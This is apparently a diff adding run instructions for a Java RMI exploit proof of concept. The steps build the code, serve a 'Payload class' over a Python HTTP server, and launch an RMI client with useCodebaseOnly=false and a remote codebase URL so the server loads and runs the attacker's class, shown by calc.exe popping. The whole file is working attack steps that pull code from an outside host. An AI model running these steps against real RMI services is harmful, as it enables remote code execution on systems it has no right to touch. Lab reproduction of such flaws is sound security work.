@@ -1,0 +1,8 @@
+# 1. build
+javac *.java
+
+# 2. start http server for Server's request Payload class
+python3 -m http.server 80
+
+# 3. send rmi request, after request calc.exe should pop on Server and Client
+java -Djava.security.manager -Djava.security.policy=client.policy -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://192.168.1.12/ RMIClient
